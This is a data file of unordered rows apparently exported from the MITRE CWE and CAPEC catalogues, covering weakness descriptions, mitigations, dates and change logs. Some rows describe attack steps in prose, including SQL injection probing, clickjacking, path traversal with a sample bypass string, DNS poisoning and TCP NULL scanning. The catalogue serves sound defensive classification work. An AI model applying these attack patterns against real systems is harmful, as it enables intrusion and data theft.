19231	62	updated Relationships
13170	68	The effectiveness of this mitigation depends on the prevention capabilities of the specific sandbox or jail being used and might only help to reduce the scope of an attack, such as restricting the attacker to certain system calls or limiting the portion of the file system that can be accessed.
18504	21	PLOVER
11409	42	To help mitigate XSS attacks against the user's session cookie, set the session cookie to be HttpOnly. In browsers that support the HttpOnly feature (such as more recent versions of Internet Explorer and Firefox), this attribute can prevent the user's session cookie from being accessible to malicious client-side scripts that use document.cookie. This is not a complete solution, since HttpOnly is not supported by all browsers. More importantly, XMLHTTPRequest and other powerful browser technologies provide read access to HTTP headers, including the Set-Cookie header in which the HttpOnly flag is set.
10076	28	CWE Content Team
15985	39	2011-06-01
20176	21	PLOVER
20215	39	2009-07-27
8291	81	Integrity
12258	28	CWE Content Team
21325	53	The MITRE Corporation
24991	101	CAPEC Content Team
25082	56	ChildOf
18094	103	Primary
24385	94	Denial of Service
20576	42	Consider using MVC based frameworks such as Struts.
11316	69	Draft
15208	35	MITRE
11947	39	2012-10-30
16890	91	Architecture and Design
22339	50	If possible, physically disable the microphone on your machine if it is not needed.
21553	44	SOAR Partial
22871	62	updated Common_Consequences
6728	35	MITRE
5733	90	Language-Independent
11579	50	Design: Execute programs with constrained privileges, so parent process does not open up further vulnerabilities. Ensure that all directories, temporary directories and files, and memory are executing with limited privileges to protect against remote execution.
6284	61	Stable
11317	44	High
19568	35	MITRE
12221	89	Standard
18707	104	1102
19835	35	MITRE
21675	28	CWE Content Team
10016	62	updated Common_Consequences, References, Relationships, Taxonomy_Mappings, Weakness_Ordinalities
22065	43	Simple
19122	53	The MITRE Corporation
6091	60	15
24895	32	CGISecurity.com
18116	59	Updated Activation_Zone, Attacker_Skills_or_Knowledge_Required, Description Summary, Injection_Vector, Other_Notes, Payload, Payload_Activation_Impact, Related_Attack_Patterns, Related_Weaknesses
20412	85	32
22072	49	2010
24538	23	This type of attack against older telephone switches and trunks has been around for decades. A tone is sent by an adversary to impersonate a supervisor signal which has the effect of rerouting or usurping command of the line. While the US infrastructure proper may not contain widespread vulnerabilities to this type of attack, many companies are connected globally through call centers and business process outsourcing. These international systems may be operated in countries which have not upgraded Telco infrastructure and so are vulnerable to Blue boxing. Blue boxing is a result of failure on the part of the system to enforce strong authorization for administrative functions. While the infrastructure is different than standard current applications like web applications, there are historical lessons to be learned to upgrade the access control for administrative functions.
19284	76	2017-05-01
13700	62	updated Common_Consequences
22832	28	CWE Content Team
23117	59	Updated Related_Weaknesses
6912	78	High
15967	31	1000
18365	73	An attacker makes authorized connections and records the session tokens or credentials issued.
22561	28	CWE Content Team
6296	79	Integrity
11243	56	ChildOf
15006	35	MITRE
15016	39	2017-11-08
8766	28	CWE Content Team
14731	39	2017-11-08
19265	62	updated Observed_Examples, Relationships
17871	101	CAPEC Content Team
15564	47	Modify Data
13984	66	Exploitable Redirects on the Web: Identification, Prevalence, and Defense
9788	66	Valgrind
9745	28	CWE Content Team
9966	54	High
9617	56	ChildOf
22923	42	When deserializing data, populate a new object rather than just deserializing. The result is that the data flows through safe input validation and that the functions are safe.
23033	56	ChildOf
14544	56	CanPrecede
12811	89	Detailed
20453	91	Implementation
10654	103	Primary
20208	92	Exploit
6415	103	Primary
8620	53	The MITRE Corporation
16042	104	563
11037	39	2012-05-11
16280	28	CWE Content Team
12035	35	MITRE
11747	28	CWE Content Team
21889	79	Confidentiality
14965	91	Architecture and Design
22238	28	CWE Content Team
23963	81	Confidentiality
6876	40	SQL queries used by the application to store, retrieve or modify data.
21001	72	In some cases, injectable code controls authentication; this may lead to a remote vulnerability.
20047	42	Utilize an appropriate mix of whitelist and blacklist parsing to filter server-side include syntax from all input.
17524	76	2017-05-01
16237	35	MITRE
18432	40	The target application must utilize temporary files and must fail to adequately secure them against other parties reading them.
20255	26	Implementation
11982	35	MITRE
19689	62	updated Relationships, Other_Notes, Taxonomy_Mappings, Weakness_Ordinalities
7965	95	[Trick victim into interacting with the iFrame overlay page in the desired manner] The attacker tricks the victim into clicking on the areas of the UI which contain the hidden action controls and thereby interacts with the target system maliciously with the victim's level of privilege.
15687	103	Primary
13694	39	2011-06-01
17320	103	Primary
18293	91	Architecture and Design
19261	76	2018-07-31
22262	34	COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic.
22959	73	Determine whether UTF-8 encoding is accepted by the application/system.
18546	88	Public Static Field Not Marked Final
22396	21	PLOVER
6313	39	2013-07-17
13065	35	MITRE
14321	28	CWE Content Team
19150	40	The target application must unserialize data before validation.
13427	35	MITRE
20127	42	If you must expose a method, make sure to perform input validation on all arguments, and protect against all possible vulnerabilities.
11644	56	Requires
20038	81	Other
8770	102	ChildOf
11972	63	Unexpected State
18177	62	updated Applicable_Platforms, Relationships, Other_Notes, Taxonomy_Mappings
12435	39	2013-02-21
16135	47	Read Data
17066	28	CWE Content Team
18837	66	Network Security Access Restrictions in Silverlight
14790	53	The MITRE Corporation
15617	63	Modify Application Data
20263	35	MITRE
20002	35	MITRE
25238	55	CAPEC Content Team
14425	39	2012-10-30
24036	61	Draft
13677	81	Integrity
9940	23	An attacker crafts malicious web links and distributes them (via web pages, email, etc.), typically in a targeted manner, hoping to induce users to click on the link and execute the malicious action against some third-party application. If successful, the action embedded in the malicious link will be processed and accepted by the targeted application with the users' privilege level. This type of attack leverages the persistence and implicit trust placed in user session cookies by many web applications today. In such an architecture, once the user authenticates to an application and a session cookie is created on the user's system, all following transactions for that session are authenticated using that cookie including potential actions initiated by an attacker and simply "riding" the existing session cookie.
7117	39	2018-03-27
21576	28	CWE Content Team
11486	102	ChildOf
13671	28	CWE Content Team
9083	62	updated Related_Attack_Patterns, Relationships
12384	43	Simple
16192	28	CWE Content Team
14548	80	Denial of service
18600	78	Low
17813	21	Anonymous Tool Vendor (under NDA)
17626	39	2014-07-30
15582	35	MITRE
10916	39	2010-12-13
23886	28	CWE Content Team
8070	40	This attack requires the ability to monitor the target's network connection.
10118	62	Suggested OWASP Top Ten 2004 mapping
22958	31	1000
14950	56	ChildOf
15730	101	CAPEC Content Team
6733	59	Updated Related_Attack_Patterns
8301	25	Medium
23236	34	This issue can be introduced into the automated algorithm itself.
23914	79	Confidentiality
14820	81	Availability
17603	91	Architecture and Design
22911	28	CWE Content Team
5803	28	CWE Content Team
20063	62	updated Relationships
18824	39	2012-05-11
6331	62	updated Time_of_Introduction
20693	88	Variable Extraction Error
9841	50	Ensure proper HTML output encoding before writing user supplied data to the page
16854	35	MITRE
18163	35	MITRE
24804	57	Resultant
9612	35	MITRE
18338	101	CAPEC Content Team
7488	31	1000
9603	28	CWE Content Team
19144	39	2013-07-17
7822	28	CWE Content Team
19621	43	Simple
17011	35	MITRE
24387	56	ChildOf
20852	56	ChildOf
9878	21	CLASP
16037	23	Login pages not using adequate measures to protect the user name and password while they are in transit from the client to the server.
20163	62	updated Modes_of_Introduction, Relationships
13434	56	ChildOf
22991	101	CAPEC Content Team
15073	28	CWE Content Team
16457	56	ChildOf
10470	39	2014-06-23
11731	81	Confidentiality
25222	46	Error pages may include customized 403 Forbidden or 404 Not Found pages.             When an attacker can trigger an error that contains unneutralized input, then cross-site scripting attacks may be possible.
12126	31	699
12061	28	CWE Content Team
22197	35	MITRE
20401	81	Access Control
9202	63	Varies by Context
22701	40	None
10359	103	Primary
12594	102	ChildOf
9598	63	Read Application Data
14556	62	updated Description
10910	62	updated Relationships, Taxonomy_Mappings
19139	42	Develop a system to test for API functions that are not portable.
13540	103	Primary
21873	53	The MITRE Corporation
20800	56	ChildOf
16152	62	updated Common_Consequences, Maintenance_Notes, Other_Notes
22153	59	Updated Related_Weaknesses
21405	28	CWE Content Team
22732	91	Implementation
14623	103	Primary
7642	62	updated Other_Notes, Relationship_Notes
16001	28	CWE Content Team
10633	39	2017-05-03
7339	49	2008
19972	35	MITRE
18507	97	HTTP Response Splitting
9687	69	Draft
23073	39	2012-10-30
10800	25	High
23028	28	CWE Content Team
7011	35	MITRE
16939	39	2008-09-08
12277	63	Read Files or Directories
12867	47	Gain Privileges
16224	35	MITRE
24591	104	1064
13387	59	Updated Resources_Required
22120	79	Availability
14685	35	MITRE
18068	35	MITRE
20827	56	ChildOf
9190	62	updated Potential_Mitigations
24581	39	2019-01-03
12915	39	2009-05-27
14250	101	CAPEC Content Team
11533	39	2011-06-27
8291	63	DoS: Crash, Exit, or Restart
24807	28	CWE Content Team
13069	39	2010-04-05
16331	39	2014-07-30
15928	63	DoS: Resource Consumption (CPU)
18300	42	Use a language that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.                   For example, many languages that perform their own memory management, such as Java and Perl, are not subject to buffer overflows. Other languages, such as Ada and C#, typically provide overflow protection, but the protection can be disabled by the programmer.                   Be wary that a language's interface to native code may still be subject to overflows, even if the language itself is theoretically safe.
23787	39	2019-01-03
6918	35	MITRE
16704	95	The attacker acquires information about the kind of client attaching to her hostile service to determine if it contains an exploitable buffer overflow vulnerability.
10254	26	Implementation
9381	101	CAPEC Content Team
12646	74	3
17343	28	CWE Content Team
8411	39	2017-11-08
9563	71	2007
24166	72	Browsers often store information in a client-side cache, which can leave behind sensitive information for other users to find and exploit, such as passwords or credit card numbers. The locations at most risk include public terminals, such as those in libraries and Internet cafes.
22762	34	COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic.
6048	62	updated Related_Attack_Patterns, Relationships, Taxonomy_Mappings
13069	62	updated Description, Name
22725	35	MITRE
24855	31	1000
12733	46	As data is parsed, improperly handled multiple internal special elements may cause the process to take unexpected actions that result in an attack.
11683	28	CWE Content Team
10347	63	Modify Application Data
16746	63	Gain Privileges or Assume Identity
25071	91	Architecture and Design
12175	97	Overflow Binary Resource File
22425	39	2012-05-11
15552	39	2017-11-08
11642	46	This issue can prevent the software from running reliably.  If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.
10017	60	12
6843	35	MITRE
6904	91	System Configuration
22187	88	Callable with Insufficient Behavioral Summary
24569	96	2009-10-21
13383	63	DoS: Resource Consumption (CPU)
21219	62	updated Common_Consequences, Observed_Examples, Relationships, Taxonomy_Mappings
20550	28	CWE Content Team
25122	94	Run Arbitrary Code
17660	59	Updated Related_Attack_Patterns
11367	28	CWE Content Team
16150	81	Integrity
15065	45	Base
14458	28	CWE Content Team
24229	39	2010-12-13
8373	28	CWE Content Team
21635	28	CWE Content Team
19421	42	A programmer might attempt to remedy the password management problem by obscuring the password with an encoding function, such as base 64 encoding, but this effort does not adequately protect the password because the encoding can be detected and decoded easily.
11773	35	MITRE
23638	35	MITRE
8583	79	Confidentiality
6258	73	The attacker injects context-appropriate malicious file path to access the content of the targeted file.
13625	31	1000
11484	42	Use other functions that require explicit paths. Making use of any of the other readily available functions that require explicit paths is a safe way to avoid this problem. For example, system() in C does not require a full path since the shell can take care of finding the program using the PATH environment variable, while execl() and execv() require a full path.
24538	97	Blue Boxing
9802	28	CWE Content Team
18508	92	Experiment
20789	62	updated Common_Consequences, Relationships
6609	69	Draft
23413	28	CWE Content Team
7599	35	MITRE
21637	23	Quotes injected into an application can be used to compromise a system. As data are parsed, an injected/absent/duplicate/malformed use of quotes may cause the process to take unexpected actions.
21912	28	CWE Content Team
6610	42	To help mitigate XSS attacks against the user's session cookie, set the session cookie to be HttpOnly. In browsers that support the HttpOnly feature (such as more recent versions of Internet Explorer and Firefox), this attribute can prevent the user's session cookie from being accessible to malicious client-side scripts that use document.cookie. This is not a complete solution, since HttpOnly is not supported by all browsers. More importantly, XMLHTTPRequest and other powerful browser technologies provide read access to HTTP headers, including the Set-Cookie header in which the HttpOnly flag is set.
7349	62	updated Relationships, Taxonomy_Mappings
12865	28	Eric Dalci
8991	67	High
14947	39	2014-07-30
6288	55	Seamus Tuohy
18750	21	Anonymous Tool Vendor (under NDA)
13976	104	366
18693	62	updated Common_Consequences
18390	61	Draft
17413	102	ChildOf
6726	88	Divide By Zero
11442	35	Cigital
17431	56	ChildOf
7319	47	Execute Unauthorized Commands
17358	28	CWE Content Team
15121	45	Variant
16593	39	2011-06-01
24389	88	Improper Authorization
23154	27	None: No specialized resources are required to execute this type of attack.
19330	28	CWE Content Team
6865	28	CWE Content Team
15537	35	MITRE
15283	50	Implementation: Perform input validation for all remote content, including remote and user-generated content
7718	28	CWE Content Team
10571	62	updated Relationships
18704	95	The attacker then poisons the resolver for the targeted site. This is achieved by poisoning the DNS server, or the local hosts file, that directs the user to the original website
10798	81	Integrity
8438	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Fuzz Tester                            Framework-based Fuzzer                            Automated Monitored Execution                            Monitored Virtual Environment - run potentially malicious code in sandbox / wrapper / virtual machine, see if it does anything suspicious
16449	95	[Experiment with SQL Injection vulnerabilities] After determining that a given input is vulnerable to SQL Injection, hypothesize what the underlying query looks like. Iteratively try to add logic to the query to extract information from the database, or to modify or delete information in the database.
9065	56	ChildOf
14752	81	Confidentiality
14327	25	Low
13557	35	MITRE
22540	60	09
8249	23	An adversary uses a TCP NULL scan to determine if ports are closed on the target machine. This scan type is accomplished by sending TCP segments with no flags in the packet header, generating packets that are illegal based on RFC 793. The RFC 793 expected behavior is that any TCP segment with an out-of-state Flag sent to an open port is discarded, whereas segments with out-of-state flags sent to closed ports should be handled with a RST in response. This behavior should allow an attacker to scan for closed ports by sending certain types of rule-breaking packets (out of sync or disallowed by the TCB) and detect closed ports via RST packets. In addition to being fast, the major advantage of this scan type is its ability to scan through stateless firewall or ACL filters. Such filters are configured to block access to ports usually by preventing SYN packets, thus stopping any attempt to 'build' a connection. NULL packets, like out-of-state FIN or ACK packets, tend to pass through such devices undetected. Many operating systems, however, do not implement RFC 793 exactly and for this reason NULL scans do not work as expected against these devices. Some operating systems, like Microsoft Windows, send a RST packet in response to any out-of-sync (or malformed) TCP segments received by a listening socket (rather than dropping the packet via RFC 793), thus preventing an attacker from distinguishing between open and closed ports. NULL scans are limited by the range of platforms against which they work. Additionally, because open ports are inferred via no responses being generated, one cannot distinguish an open port from a filtered port without further analysis. For instance, NULL scanning a system protected by a stateful firewall may indicate all ports being open. Because of their obvious rule-breaking nature, NULL scans are flagged by almost all intrusion prevention or intrusion detection systems.
16482	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
9825	31	699
9170	79	Authorization
20672	35	MITRE
19307	62	updated Description, Name
19127	92	Exploit
24987	80	Forcibly browseable pages can be discovered by using a number of automated tools. Doing the same manually is tedious but by no means difficult.
11391	23	The software contains a client with a function or method that contains a large number of data accesses/queries that are sent through a data manager, i.e., does not use efficient database capabilities.
15550	62	updated Demonstrative_Examples, References, Related_Attack_Patterns, Relationships
18976	50	Employ appropriate levels of segmentation to your network in accordance with best practices.
14589	35	MITRE
25304	31	1000
16955	42	Design the software so that one cryptographic algorithm can be replaced with another. This will make it easier to upgrade to stronger algorithms.
24832	28	CWE Content Team
15146	73	Create a file that does not exist in the target directory (e.g. "touch temp.txt" in UNIX-like systems)
11981	79	Integrity
24644	62	updated Relationships
7656	35	MITRE
8600	81	Access Control
12264	35	MITRE
23541	42	Ensure that password aging is limited so that there is a defined maximum age for passwords and so that the user is notified several times leading up to the password expiration.
25195	33	Stefan Esser
16107	28	Eric Dalci
7435	35	MITRE
9842	88	Improper Neutralization of Parameter/Argument Delimiters
18889	66	Poison NULL byte
23278	35	MITRE
13746	62	updated Observed_Examples, Potential_Mitigations
21202	35	MITRE
15342	62	updated Detection_Factors, Potential_Mitigations
15653	50	Design: Enforce principle of least privilege
21492	62	updated Relationships, Taxonomy_Mappings
9220	28	CWE Content Team
11254	21	CWE Content Team
9238	43	Simple
19478	55	CAPEC Content Team
14201	101	CAPEC Content Team
19818	97	SOAP Manipulation
18395	56	ChildOf
20845	43	Simple
10732	102	ChildOf
16727	95	[Access, modify, or execute arbitrary files.] An attacker injects path traversal syntax into identified vulnerable inputs to cause inappropriate reading, writing or execution of files. An attacker could be able to read directories or files which they are normally not allowed to read. The attacker could also access data outside the web document root, or include scripts, source code and other kinds of files from external websites. Once the attacker accesses arbitrary files, he/she could also modify files. In particular situations, the attacker could also execute arbitrary code or system commands.
11885	62	updated Common_Consequences
8126	56	ChildOf
21969	81	Other
13072	62	updated Applicable_Platforms, Demonstrative_Examples, Potential_Mitigations
24623	34	In web-based applications, debug code is used to test and modify web application properties, configuration information, and functions. If a debug application is left on a production server, this oversight during the "software process" allows attackers access to debug functionality.
15928	63	DoS: Crash, Exit, or Restart
12840	56	ChildOf
11020	35	MITRE
8636	23	This pattern of attack involves an adversary that uses stolen credentials to leverage remote services such as RDP, telnet, SSH, and VNC to log into a system. Once access is gained, any number of malicious activities could be performed.
19400	100	The MITRE Corporation
15727	79	Integrity
19389	51	2018-05-31
8061	92	Experiment
18279	62	updated Relationships, Taxonomy_Mappings
24414	81	Integrity
5932	39	2014-07-30
10628	28	CWE Content Team
11257	35	MITRE
9685	28	CWE Content Team
14521	31	1000
17260	50	Input should be parameterized, or restricted to data sections of a command, thus removing the chance that the input will be treated as part of the command itself.
6039	101	CAPEC Content Team
19700	56	ChildOf
18153	73	The attacker reverse engineers the client-side code to determine which functionality to disable or remove.
20172	35	MITRE
17627	62	updated Relationships, Taxonomy_Mappings
14237	76	2019-09-30
6255	28	CWE Content Team
16264	96	2008-01-18
21599	59	Updated Related_Attack_Patterns
22450	77	Automated Static Analysis - Source Code
15155	90	C++
12572	35	MITRE
10701	69	Incomplete
12317	23	The use of cryptanalytic techniques to derive cryptographic keys or otherwise effectively defeat cellular encryption to reveal traffic content. Some cellular encryption algorithms such as A5/1 and A5/2 (specified for GSM use) are known to be vulnerable to such attacks and commercial tools are available to execute these attacks and decrypt mobile phone conversations in real-time. Newer encryption algorithms in use by UMTS and LTE are stronger and currently believed to be less vulnerable to these types of attacks. Note, however, that an attacker with a Cellular Rogue Base Station can force the use of weak cellular encryption even by newer mobile devices.
23978	96	2008-11-24
13749	79	Authorization
8360	100	The MITRE Corporation
23884	62	updated Demonstrative_Examples, Relationships
11465	39	2011-06-01
8281	39	2011-06-27
14970	26	Implementation
12826	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
15879	62	updated Observed_Examples
10285	103	Primary
12719	76	2018-07-31
14717	39	2015-12-07
12789	56	ChildOf
24652	39	2012-10-30
11428	39	2014-07-30
11217	95	[Survey the application for user-controllable inputs] Using a browser or an automated tool, an attacker follows all public links and actions on a web site. He records all the links, the forms, the resources accessed and all other potential entry-points for the web application.
10606	31	1000
17432	57	Primary
22850	62	Improved the White_Box_Definition
7544	44	High
21486	55	CAPEC Content Team
11611	35	MITRE
17424	35	MITRE
18781	28	CWE Content Team
6706	93	Limited
15457	35	Cigital
10073	28	CWE Content Team
11489	59	Updated Related_Weaknesses
25102	62	updated Time_of_Introduction
24012	33	Yuxuan Chen
5957	62	updated References, Relationships
21936	28	CWE Content Team
24706	81	Availability
10806	63	Read Application Data
17301	62	updated Maintenance_Notes, Relationships, Other_Notes, Taxonomy_Mappings
21076	28	CWE Content Team
17396	35	MITRE
18305	35	MITRE
17623	81	Other
24901	31	699
17446	28	CWE Content Team
15150	79	Confidentiality
8065	101	CAPEC Content Team
24880	62	updated Relationships, Other_Notes
6076	39	2009-07-27
14992	56	ChildOf
17609	21	CWE Content Team
24730	91	Implementation
25385	35	MITRE
10349	35	MITRE
6351	62	updated Potential_Mitigations
10941	81	Other
22455	31	1000
6757	35	MITRE
11167	26	Architecture and Design
24369	39	2010-02-16
9902	97	Hardware Component Substitution During Baselining
25323	62	updated Demonstrative_Examples, Potential_Mitigations
23641	62	updated Background_Details, Other_Notes
22241	28	CWE Content Team
11386	21	PLOVER
15124	81	Confidentiality
18665	51	2014-06-23
23919	42	Carefully check each input parameter against a rigorous positive specification (whitelist) defining the specific characters and format allowed. All input should be neutralized, not just parameters that the user is supposed to specify, but all data in the request, including tag attributes, hidden fields, cookies, headers, the URL itself, and so forth. A common mistake that leads to continuing XSS vulnerabilities is to validate only fields that are expected to be redisplayed by the site. We often encounter data from the request that is reflected by the application server or the application that the development team did not anticipate. Also, a field that is not currently reflected may be used by a future developer. Therefore, validating ALL parts of the HTTP request is recommended.
8918	39	2008-09-08
23164	28	Eric Dalci
19976	79	Access Control
10092	91	Architecture and Design
23766	28	CWE Content Team
23637	62	updated Demonstrative_Examples, References, Relationships
21976	28	Sean Eidemiller
15840	61	Draft
9663	28	CWE Content Team
21504	28	CWE Content Team
18522	78	High
6598	102	CanPrecede
25339	59	Updated Attack_Phases
11613	97	Resource Location Spoofing
21104	59	Updated Attack_Motivation-Consequences
25206	39	2017-11-08
15315	59	Updated Examples-Instances, Related_Attack_Patterns, Typical_Likelihood_of_Exploit
10189	100	The MITRE Corporation
24457	43	Simple
19415	39	2008-11-24
8373	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
20323	46	This allows attackers to traverse the file system to access files or directories that are outside of the restricted directory.             The 'dir\..\..\filename' manipulation is useful for bypassing some path traversal protection schemes. Sometimes a program only removes one "..\" sequence, so multiple "..\" can bypass that check. Alternately, this manipulation could be used to bypass a check for "..\" at the beginning of the pathname, moving up more than one directory level.
9434	26	Architecture and Design
8849	35	MITRE
18509	66	Canoe: XSS prevention via context-aware output encoding
9408	35	MITRE
15897	28	CWE Content Team
13405	28	CWE Content Team
19307	28	CWE Content Team
22927	62	updated Relationships, Observed_Example, Other_Notes, Taxonomy_Mappings
7702	62	updated Applicable_Platforms, Common_Consequences, Demonstrative_Examples, Likelihood_of_Exploit, References, Taxonomy_Mappings
22741	42	Ensure that only one extension is used in the filename. Some web servers, including some versions of Apache, may process files based on inner extensions so that "filename.php.gif" is fed to the PHP interpreter.[REF-422] [REF-423]
13076	35	MITRE
23724	56	ChildOf
23297	28	CWE Content Team
14504	28	CWE Content Team
24705	35	MITRE
21317	77	Automated Static Analysis - Binary or Bytecode
11131	35	MITRE
18866	63	Other
5883	28	CWE Content Team
10186	104	580
23302	42	Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass whitelist validation schemes by introducing dangerous inputs after they have been checked.
23726	31	699
12452	81	Other
24018	35	MITRE
12392	23	The software does not properly check when a function or operation returns a value that is legitimate for the function, but is not expected by the software.
8689	62	updated Functional_Areas, Relationships, Research_Gaps, Taxonomy_Mappings, Type
12576	100	The MITRE Corporation
18291	40	The adversary must have gained access to the target system via physical or logical means in order to carry out this attack.
8756	62	updated Modes_of_Introduction, Relationships
20328	35	MITRE
10159	35	MITRE
11058	35	MITRE
24741	28	CWE Content Team
23618	50	Design: Ensure that the transparent proxy uses an actual network layer IP address for routing requests. On the transparent proxy, disable the use of routing based on address information in the HTTP host header.                Configuration: Disable in the browser the execution of Java Script, Flash, SilverLight, etc.
19272	62	updated Common_Consequences
10711	28	CWE Content Team
15603	42	Inner Classes do not provide security. Warning: Never reduce the security of the object from an outer class, going to an inner class. If an outer class is final or private, ensure that its inner class is private as well.
7685	31	699
16765	62	updated Applicable_Platforms
19457	39	2011-06-27
10428	35	MITRE
20948	39	2018-01-16
18636	34	When the software uses certificate pinning, the developer might not properly validate all relevant components of the certificate before pinning the certificate. This can make it difficult or expensive to test after the pinning is complete.
17456	62	updated Relationships
12806	28	CWE Content Team
14856	59	Updated Description Summary, Resources_Required
8666	62	updated Relationships
20020	59	Updated Related_Weaknesses
14256	28	CWE Content Team
25387	50	Implementation: Perform output validation for all remote content.
11892	28	CWE Content Team
17338	62	updated Applicable_Platforms
8823	103	Primary
13020	35	MITRE
11457	62	updated Description, Name
14835	77	Manual Static Analysis - Binary or Bytecode
9494	35	MITRE
6750	62	updated Demonstrative_Examples, Potential_Mitigations
6777	79	Availability
12354	63	DoS: Crash, Exit, or Restart
14387	90	C
17415	35	MITRE
8242	39	2009-03-10
22420	92	Exploit
23714	39	2008-07-01
24486	39	2010-06-21
8070	97	Connection Reset
15278	46	Reliance on components that are no longer maintained can make it difficult or impossible to fix significant bugs, vulnerabilities, or quality issues. In effect, unmaintained code can become obsolete. This issue makes it more difficult to maintain the software, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.
23809	35	MITRE
18222	79	Confidentiality
24642	60	18
7509	63	Read Application Data
11038	73	Manually navigate web site pages to identify URLs.
14292	101	CAPEC Content Team
18532	104	1024
19555	39	2017-11-08
16486	62	updated Applicable_Platforms
12665	36	http://sla.ckers.org/forum/read.php?24,28687
8539	28	CWE Content Team
14260	23	The program releases a resource that is still intended to be used by the program itself or another actor.
13194	28	CWE Content Team
7838	40	A website that handles sensitive information but does not use a secure connection and a certificate that is valid is also prone to pharming
10148	62	updated Description, Maintenance_Notes
21814	28	CWE Content Team
7690	78	High
12223	92	Explore
25012	61	Stable
12304	73	Attacker manually assesses strength of access control protecting native application files from user control
12981	39	2009-03-10
20713	59	Updated Related_Weaknesses
5852	62	updated Demonstrative_Examples
24230	35	MITRE
11228	99	Wiley
7437	63	Modify Application Data
21065	63	Modify Application Data
10854	62	updated Description, Relationships
23189	56	CanPrecede
8521	59	Updated Architectural_Paradigms, Related_Attack_Patterns, Technical_Context
24896	42	When processing structured incoming data containing a size field followed by raw data, identify and resolve any inconsistencies between the size field and the actual size of the data (CWE-130).
8019	39	2008-09-08
8032	62	updated Description, Relationships, Other_Notes
6646	33	David LeBlanc
24198	28	CWE Content Team
24197	23	Configuring an ASP.NET application to run with impersonated credentials may give the application unnecessary privileges.
23729	62	updated Relationships
5988	35	Cigital
6348	81	Integrity
5997	35	MITRE
5715	55	CAPEC Content Team
22942	72	This weakness could be exploited by an attacker in a number ways depending on the context. If a predictable number is used to generate IDs or keys that are used within protection mechanisms, then an attacker could gain unauthorized access to the system. If predictable filenames are used for storing sensitive information, then an attacker might gain access to the system and may be able to gain access to the information in the file.
21363	104	471
9846	59	Updated References
10699	47	Resource Consumption
8716	35	MITRE
17283	35	MITRE
23263	97	Excessive Allocation
8928	50	Usage of configuration settings, such as stream ciphers vs. block ciphers and setting timeouts on SSL sessions to extremely low values lessens the potential impact. Use of later versions of TLS (e.g. TLS 1.1+) can also be effective, but not all clients or servers support the later versions.
19575	31	699
23353	62	updated Relationships
7095	62	updated Description, Other_Notes
16963	48	08
15733	39	2017-05-03
23067	39	2011-09-13
21764	28	CWE Content Team
9873	43	Simple
12134	62	updated Time_of_Introduction
22488	39	2009-05-27
18620	62	updated References
9190	35	MITRE
24977	66	OWASP Attack listing
18132	39	2010-12-13
5754	104	550
15349	96	2008-01-30
20564	100	The MITRE Corporation
6516	91	Implementation
8671	91	Implementation
7937	28	CWE Content Team
6389	35	MITRE
10559	35	MITRE
10718	103	Primary
10692	76	2017-01-09
16766	90	Language-Independent
9997	59	Updated Attack_Phases, Resources_Required
23141	63	Gain Privileges or Assume Identity
14737	56	ChildOf
9297	46	The use of sizeof() on a pointer can sometimes generate useful information. An obvious case is to find out the wordsize on a platform. More often than not, the appearance of sizeof(pointer) indicates a bug.
7815	35	MITRE
23780	56	ChildOf
14247	74	2
5945	42	Use dynamic tools and techniques that interact with the software using large test suites with many diverse inputs, such as fuzz testing (fuzzing), robustness testing, and fault injection. The software's operation may slow down, but it should not become unstable, crash, or generate incorrect results.
18447	62	updated Taxonomy_Mappings
10089	104	41
22155	62	updated Relationships, Relationship_Notes, Taxonomy_Mappings, Weakness_Ordinalities
12613	62	updated Modes_of_Introduction, Relationships
20743	39	2014-07-30
17429	103	Primary
11799	63	Reduce Maintainability
24941	103	Primary
6358	100	The MITRE Corporation
24218	30	Robert C. Seacord
16973	27	The ability to craft custom RPC datagrams for use during network reconnaissance via native OS utilities or a port scanning tool. By tailoring the bytes injected one can scan for specific RPC-registered services. Depending upon the method used it may be necessary to sniff the network in order to see the response.
9012	47	Modify Data
9198	28	CWE Content Team
23132	39	2011-06-01
21747	35	MITRE
9628	62	updated Common_Consequences
8324	35	MITRE
24552	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
6585	35	MITRE
15133	34	COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic.
19142	103	Primary
20692	73	Use the web inventory of all forms and inputs and apply attack data to those inputs.
18340	92	Experiment
20090	91	Operation
19366	47	Alter Execution Logic
11709	35	MITRE
25130	39	2014-07-30
8755	28	CWE Content Team
6963	100	The MITRE Corporation
7935	26	Implementation
8970	26	Architecture and Design
11730	62	updated Time_of_Introduction
22562	35	MITRE
24162	28	Eric Dalci
16210	62	updated Relationships, Taxonomy_Mappings
23647	62	updated Description, Name
19123	40	Target client software must be a client that allows scripting communication from remote hosts, such as a JavaScript-enabled Web Browser.
11646	35	MITRE
13477	35	MITRE
24670	62	updated Relationships
13690	57	Indirect
18950	35	Cigital
19937	54	Low
10774	39	2011-06-01
20348	62	updated Description, Name
5740	39	2011-06-01
5736	28	CWE Content Team
8351	62	updated Demonstrative_Examples
19002	35	MITRE
9564	35	MITRE
17014	39	2014-07-30
7581	48	02
19071	89	Detailed
8005	80	The adversary uses a third-party tool to obtain hashed credentials to execute the attack.
19123	50	Design: Utilize strict type, character, and encoding enforcement
7535	39	2008-09-08
16130	44	SOAR Partial
11526	62	updated Potential_Mitigations, Relationships
23251	72	This weakness can cause unintended logic to be executed and other unexpected application behavior.
15128	62	updated Time_of_Introduction
12288	40	SQL queries used by the application to store, retrieve or modify data.
14677	88	Improper Neutralization of Null Byte or NUL Character
23989	74	1
15079	39	2011-09-13
8645	35	MITRE
15211	62	updated Potential_Mitigations, Time_of_Introduction
16252	28	CWE Content Team
21313	35	Veracode
22140	40	The attacker can manipulate the value of an integer variable utilized by the target host.
6302	28	CWE Content Team
17334	31	1000
